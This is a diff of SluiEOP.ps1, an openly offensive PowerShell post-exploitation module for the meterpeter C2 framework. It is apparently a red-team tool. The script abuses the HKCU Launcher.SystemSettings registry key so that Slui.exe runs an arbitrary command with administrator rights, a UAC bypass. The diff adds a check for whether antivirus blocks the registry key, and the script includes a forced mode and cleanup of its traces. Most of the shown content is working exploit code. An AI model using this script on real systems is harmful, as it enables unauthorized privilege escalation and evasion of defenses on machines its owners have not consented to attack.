@@ -50,7 +50,7 @@
 
 .EXAMPLE
    PS C:\> .\SluiEOP.ps1 "powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser" -Force
-   Bypass cmdlet vulnerability tests (Force) to execute '$command' with high privileges (Admin)
+   Bypass this cmdlet vulnerability tests (-Force) to execute '$command' with high privileges (Admin)
    Remark: This function does not work under meterpeter C2 framework (automatic)
 
 .INPUTS
@@ -88,6 +88,10 @@ If(-not($param1) -or $param1 -eq $null){
    $Command = "$param1"
 }
 
+## SluiEOP meterpeter post-module banner
+Write-Host "`nSluiEOP v1.10 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
+Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 400
+
 ## Check for regedit vulnerable HIVE existence before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -EA SilentlyContinue
 If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
@@ -95,15 +99,19 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
    ## Check for windows native vulnerable binary existence.  
    If(-not(Test-Path -Path "$Env:WINDIR\System32\Slui.exe") -and $param2 -iNotMatch '-Force'){
       If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
-      Write-Host "`nSluiEOP v1.10 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
       Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
       Write-Host "[ ] NOT FOUND: '$Env:WINDIR\System32\Slui.exe'`n" -ForegroundColor red -BackgroundColor Black
       Exit
    }
 
-   ## SluiEOP meterpeter post-module banner
-   Write-Host "`nSluiEOP v1.10 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
-   Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 400
+   ## Anti-Virus registry Hive|Keys detection checks
+   cmd /R REG ADD "HKCU\Software\Classes\Launcher.SystemSettings\shell\Open" /f|Out-Null
+   If(-not(Test-Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open") -and $param2 -iNotMatch '-Force'){
+      If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
+      Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
+      Write-Host "[ ] SluiEOP can't create the required registry key.`n" -ForegroundColor red -BackgroundColor Black
+      Exit
+   }
 
    ## Delete 'persistence' '$Command' left behind by: '$MakeItPersistence' function.
    # This function 'reverts' all regedit hacks to the previous state before the EOP.
@@ -130,7 +138,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Milliseconds 400
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Milliseconds 400
-   New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Milliseconds 400
+   # New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Milliseconds 400
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "(default)" -Value Open -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Milliseconds 400
@@ -275,7 +283,6 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
 
 }Else{
    ## Vulnerable registry Hive => NOT FOUND
-   Write-Host "`nSluiEOP v1.10 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
    Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
    Write-Host "[ ] NOT FOUND: 'HKCU:\Software\Classes\Launcher.SystemSettings'`n" -ForegroundColor red -BackgroundColor Black
 }
@@ -284,3 +291,4 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
 If(Test-Path "$Env:TMP\sLUIEop.log"){Get-Content -Path "$Env:TMP\sLUIEop.log" -EA SilentlyContinue;Remove-Item -Path "$Env:TMP\sLUIEop.log" -Force -EA SilentlyContinue}
 If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
 Exit
+
